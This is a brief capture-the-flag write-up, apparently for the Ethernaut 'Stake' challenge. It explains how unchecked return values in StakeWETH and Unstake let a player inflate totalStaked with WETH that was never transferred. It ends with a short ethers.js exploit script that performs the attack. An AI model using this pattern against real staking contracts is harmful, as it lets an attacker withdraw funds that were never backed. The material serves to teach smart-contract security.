#STAKE
##Objective : 
ETH balance should be greater than  0 , `totalStaked` must be greater than the `Stake` contract's ETH balance and staked balance to be zero.

##analysis: 
StakeETH()  for  deposit of ETH.
Similarly, StakeWETH for deposit of WETH.
there is a constructor accepting the address of the WETH token
Unstake() for withdrawal of funds

##solution : 
to be a staker and to have the staked balance  to be zero, stake some ether > 0.001 and then unstake it.
StakeWETH(uint256 amount) and Unstake(uint256 amount) misses an external call return value check. 
the loop is when allowing other contracts to spend our tokens we can allow as much as we want tokens to be spend by the contract and in the same time it wont check if the transaction actually went through
takeaways:
WETH :an ERC20 token that represents ETH and is pegged 1:1 to the value of ETH.
WETH can be used directly to interact with DeFi protocols and applications.

##exploit: 
```const contract = new ethers.Contract(stakeAddress, stakeAbi, signer);
const ethAmount = ethers.utils.parseEther("0.002");
await contract.StakeETH({ value: ethAmount });
const fakeWethStake = ethers.utils.parseEther("1.0");
await contract.StakeWETH(fakeWethStake);
await contract.Unstake(ethAmount);




```
